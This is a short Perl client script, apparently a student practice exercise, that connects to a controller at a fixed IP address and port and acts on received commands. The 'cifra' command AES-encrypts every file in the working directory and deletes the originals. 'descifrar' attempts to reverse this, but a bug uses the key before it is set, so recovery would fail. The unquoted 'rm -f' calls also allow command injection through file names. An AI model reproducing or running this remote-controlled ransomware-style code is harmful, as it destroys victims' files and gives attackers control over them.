#!/bin/perl
# Cliente
use IO::Socket;
use Crypt::OpenSSL::AES;

sub main{
    my $socket = new IO::Socket::INET (
        PeerAddr => '192.168.100.10',
        PeerPort => '5555',
        Proto => 'tcp',
    ) or die "Error al crear el socket: $!\n";

    while (1){
        my $buffer = "";
        my $length = 2048;
        
        $socket -> recv($buffer, $length);
        @elements = split('-', $buffer);

        if (@elements[0] eq "cifra"){
            $output = cifra(@elements[1]);
            print $socket "$output"; 
        } elsif (@elements[0] eq "descifrar"){
            $output = descifrar(@elements[1]);
            print $socket "$output"; 
        } elsif (@elements[0] eq "salir"){
            close($socket);
            exit 1;
        } else {
            print $socket "Opción invalida\n";    
        }
    }
    close($socket);
}

sub cifra{
    my $key = shift @_;
    my $cipher = new Crypt::OpenSSL::AES($key);
    my $command = "ls |";
    my $files = 0;
    open COMAND, "$command";
    foreach $file(<COMAND>){
        chomp($file);
        unless($file =~ /practica_9/){
            
            $enc = "cipher_$file";
            open FILE, '<:raw',$file or die "Error al abrir el archivo";
            open OUTPUT, "+>", "$enc"; 
            while (($cont = read FILE, $bytes, 16) > 0){
                unless ($cont == 16){
                    $bytes .= "0"x(16 - $cont);
                }
                print OUTPUT $cipher -> encrypt($bytes)
            }
            $files += 1;
            close(FILE);
            close(OUTPUT);
            
            system("rm -f $file");
        }
    }
    close(COMAND);
    return "Cifrado completo con la clave '$key'";
}

sub descifrar{
    my $cipher = new Crypt::OpenSSL::AES($key);
    my $key = shift @_;
    my $files = 0;
    my $command = "ls |";
    open COMAND, "$command";
    foreach $file(<COMAND>){
        chomp($file);
        if($file =~ /cipher_/){
            open FILE, '<:raw', "$file" or die "Error al abrir el archivo";
            @dec = split('_', $file);
            print "@dec\n";
            $dec_file = "dec_@dec[1..$#dec]";
            open OUTPUT, "+>", "$dec_file";
            $cont = 0;
            while (($cont = read FILE, $bytes, 16) > 0){
                print OUTPUT $cipher -> decrypt($bytes)
            }
            $files += 1;
            close(FILE);
            close(OUTPUT);
            system("rm -f $file");
        }
    }
    return "Descifrado de '$files' archivos completado\n";
}

main();